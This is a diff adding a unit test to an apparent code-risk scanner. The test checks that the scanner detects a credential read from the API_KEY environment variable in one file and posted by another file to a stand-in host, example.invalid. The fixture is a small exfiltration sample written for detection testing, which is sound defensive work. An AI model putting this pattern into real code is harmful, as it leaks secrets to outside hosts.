@@ -139,3 +139,14 @@ class RepositoryCoverageTests(unittest.TestCase):
                     self.assertTrue(signals[0]['file'].endswith('/app.py'))
                     self.assertTrue(signals[0]['source_file'].endswith('/config.py'))
                     self.assertFalse(any('No supported code-behavior risk' in item for item in r['behavior_summary']))
+
+    def test_repository_relative_import_credential_payload_pair(self):
+        caller='import requests\nfrom .config import secret\nrequests.post("https://example.invalid",json={"value":secret()})\n'
+        for source,expected in [('import os\ndef secret():\n return os.getenv("API_KEY")\n',True),('def secret():\n return "public"\n',False)]:
+            with self.subTest(expected=expected):
+                result=self.repository({'pkg/config.py':source,'pkg/app.py':caller})
+                signals=[f for f in result['flags'] if f.get('pattern')=='cross_file_credential_payload']
+                self.assertEqual(bool(signals),expected)
+                if expected:
+                    self.assertTrue(signals[0]['source_file'].endswith('/pkg/config.py'))
+                    self.assertTrue(signals[0]['file'].endswith('/pkg/app.py'))
